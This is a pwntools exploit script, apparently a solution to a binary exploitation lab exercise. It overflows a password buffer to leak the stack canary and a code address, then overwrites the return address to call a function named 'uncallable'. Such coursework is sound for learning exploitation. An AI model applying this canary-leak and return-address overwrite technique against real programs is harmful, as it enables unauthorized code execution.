#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise3c'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

if args.PAUSE:
    pause()

#get static addersses of the functions print_hello and callable
e = ELF("exercise3c")
hello_func_static = hex(e.symbols['print_hello'])
uncallable_func_static = hex(e.symbols['uncallable'])
log.info(f"hello_func_static address {hello_func_static}")
log.info(f"uncallable_func_static address {uncallable_func_static}")


hello_func_static = int.from_bytes(b'\x87\x12\x00\x00\x00\x00\x00\x00', byteorder='little')
uncallable_func_static = int.from_bytes(b'\x69\x12\x00\x00\x00\x00\x00\x00', byteorder='little')


i = r.recvuntil("password:\n")
log.info(f" first trial prompt {i}") #assumng 192 away from ebp discard 40 
exploit = 159 * 'A'		#stack cannary is non 0 value followed by 4 0s so printf will stop printing right after cannary
r.sendline(exploit) 


i = r.recvuntil('of course ')
log.info(f"intro: {i}")						#on base add 12 sp 168+12 it may happen that the address has 0x00
padded_cannary_leak = r.recv(172)		#recieve our exploit and the cannary value			
log.info(f"exploit and cannary concatinated: {padded_cannary_leak }")



canary_leak = padded_cannary_leak[-12:]
canary = canary_leak[:4]
question = canary_leak[4:] 				#get the slice representing the leak
discard = b' is not the password\n'
i = 0
while i < len(question):
	if question[i] == discard[0]:
		leak = question[:i]
		break
	i = i + 1
print(leak)


#transform leak into hex int and calculate offset to add to uncallable func
leak = int.from_bytes(leak, byteorder='little')
offset = leak - hello_func_static
ret = uncallable_func_static + offset
ret = ret.to_bytes(8, byteorder='little')


exploit =  160 * b'A' + canary + 36*b'A' + ret + b'\n'
#process the fail and retrial
i = r.recvuntil("password\n")
log.info(f"first data {i}")
i = r.recvuntil("password:\n")
log.info(f"first data {i}")

r.sendline(exploit) 
j = r.recvall()
log.info(f"final data {j}")